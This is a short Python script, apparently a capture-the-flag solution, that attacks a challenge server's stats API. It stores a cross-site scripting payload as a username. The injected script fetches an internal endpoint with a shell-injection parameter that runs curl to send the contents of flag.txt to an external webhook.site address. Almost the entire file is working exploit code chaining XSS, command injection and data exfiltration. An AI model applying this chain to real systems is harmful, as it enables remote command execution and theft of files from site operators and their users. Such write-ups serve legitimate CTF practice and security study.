import requests

url = "http://chal.competitivecyber.club:13337/api/stats"

hook = 'https://webhook.site/607eaea6-e5d5-4b19-9fed-a20c88b43f18'
cmd = f'?modifier=;curl {hook}?$(cat flag.txt)'
xss = f"<script>fetch('/api/cal{cmd}')</script>"

resp = requests.request("POST", url, json={"username": xss, "high_score": 0})
uuid = resp.json()['id']

print(uuid)
# a4e1ff18-834a-401a-8060-75ab583b3e86
